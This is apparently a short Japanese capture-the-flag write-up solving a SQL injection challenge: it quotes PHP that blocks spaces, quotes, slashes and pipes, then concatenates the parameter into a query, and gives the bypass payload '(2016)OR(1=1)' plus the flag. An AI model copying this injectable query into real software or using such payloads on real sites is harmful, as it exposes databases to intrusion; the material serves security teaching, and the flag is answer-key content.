# Writeup

SQLインジェクションをしてフラグを入手する。ただし、使えるクエリ文字列には制限がある。

```php
//一部の文字は利用出来ません。以下の文字を使わずにFLAGを手に入れてください。
if (preg_match('/\s/', $year))
    exit('危険を感知'); //スペース禁止
if (preg_match('/[\']/', $year))
    exit('危険を感知'); //シングルクォート禁止
if (preg_match('/[\/\\\\]/', $year))
    exit('危険を感知'); //スラッシュとバックスラッシュ禁止
if (preg_match('/[\|]/', $year))
    exit('危険を感知'); //バーティカルバー禁止                    

//クエリを作成する。
$query = "SELECT * FROM anime WHERE years =$year";
```

クエリパラメータに`(2016)OR(1=1)`を与える。すると、`SELECT * FROM anime WHERE years =(2016)OR(1=1)`が実行されてすべての`anime`カラムが取得できる。

https://sql1.wanictf.org/index.php?year=(2016)OR(1=1)

[参考]

* https://security.stackexchange.com/questions/127655/would-removing-spaces-in-a-string-protect-against-sql-injection

<!-- FLAG{53cur3_5ql_a283b4dffe}	 -->